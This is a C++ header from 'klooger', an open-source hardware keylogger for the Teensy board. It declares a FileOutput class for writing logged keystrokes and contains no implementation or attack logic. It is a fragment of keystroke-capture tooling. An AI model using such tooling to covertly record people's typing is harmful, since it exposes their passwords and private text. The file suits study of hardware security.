/*
 * klooger - a hardware keylogger based on the Teensy
 * Copyright (C) 2012 Michael Drost
 *
 * This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 3 of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty
 * of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along with this program; if not, see <http://www.gnu.org/licenses/>.
 */

/*
 * This file contains the declaration of the FileOutput class
 */
#ifndef __FILEOUTPUT__
#define __FILEOUTPUT__

#include "Output.h"
#include <usb_api.h> //include the file containing the Keyboard class

class FileOutput: public LoggingOutput{
  bool mInitialized;
  bool SECURE_CALL_P(boolean cond, const char* errorstr);
public:
  FileOutput();
  virtual void initialize();
  virtual void print(char c);
  virtual void prints(const char* c);
  virtual void printToOutput(Output* out);
  virtual void clear();
};

#endif
